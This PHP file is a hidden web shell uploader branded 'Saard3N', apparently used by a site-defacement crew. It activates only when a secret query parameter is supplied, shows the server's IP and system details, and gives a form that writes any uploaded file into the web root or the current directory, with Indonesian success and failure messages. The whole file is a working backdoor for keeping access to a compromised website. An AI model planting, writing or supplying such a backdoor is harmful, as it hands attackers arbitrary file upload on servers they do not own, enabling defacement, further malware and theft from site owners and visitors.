<?php
if($_GET['saar'] == 'd3n')
{
echo '<center>';
echo '<h1> Uploader By Saard3N </h1>';
echo '<img src="http://tools.jakartaparanoid.org/tg-jp.gif" width="425px"><p>';
echo "[ SERVER IP // YOUR IP</font> ]<br><font color=lime>
".gethostbyname($_SERVER['HTTP_HOST'])." </font>// <font color=red>".getClientIP()."</br></font><p>";
echo "[ SYSTEM INFO ]<br><font color=lime size=2>".php_uname()."</br></font><p>"; 
$show_ds = (!empty($ds)) ? "<font color=red size=2>$ds</font>" : "<font color=lime size=2>NONE</font>";
echo "[ DISABLE FUNCTIONS ]<br><font color=lime size=2>$show_ds</font><p>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='shootz!'>
	  </form>";
echo '<head>
<script src="https://kit.fontawesome.com/a076d05399.js"></script>
<iframe src="https://i.top4top.io/m_154719dfe0.mp3" frameborder="0" height="0" width="0"></iframe>
<meta name="viewport" content="width=device-width, initial-scale=0.8">
<title>Saard3N</title>
<link href="https://fonts.googleapis.com/css?family=Poppins" rel="stylesheet" type="text/css">
</head>';
echo '<style>
body { 

background-color: black;
font-family: Poppins;
color: white;
text-align: center;
margin-top: 20px;

}

input {
  
  background: transparent;
  border: 2px solid white;
  border-radius: 3px;
  color: white;
  font-family: Poppins;
  
}

input [type=file] {
  
  background: transparent;
  border: 1px solid white;
  border-radius: 3px;
  color: white;
  font-family: Poppins;
  
}

a {

 text-docoration: none;
 color: lime;
 size: 2px;

}

h1 { 

 color: white;
 font-family: Poppins;
 text-decoration: line-through;
 
}

.responsive {

 width; 100%;
 height: auto;

}

</style>';
echo '</center>';
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "[ S U K S E S ]<br><a href='$web/$files' target='_blank'><font size=2px><u>$web$files</br></font></u></a>";
		} else {
			echo "gagal upload di document root.";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "sukses upload <b>$files</b> di folder ini";
		} else {
			echo "Gagal!";
		}
	}
}
}
function getClientIP() {
 
    if (isset($_SERVER)) {
 
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
            return $_SERVER["HTTP_CLIENT_IP"];
 
        return $_SERVER["REMOTE_ADDR"];
    }
 
    if (getenv('HTTP_X_FORWARDED_FOR'))
        return getenv('HTTP_X_FORWARDED_FOR');
 
    if (getenv('HTTP_CLIENT_IP'))
        return getenv('HTTP_CLIENT_IP');
 
    return getenv('REMOTE_ADDR');
}
?>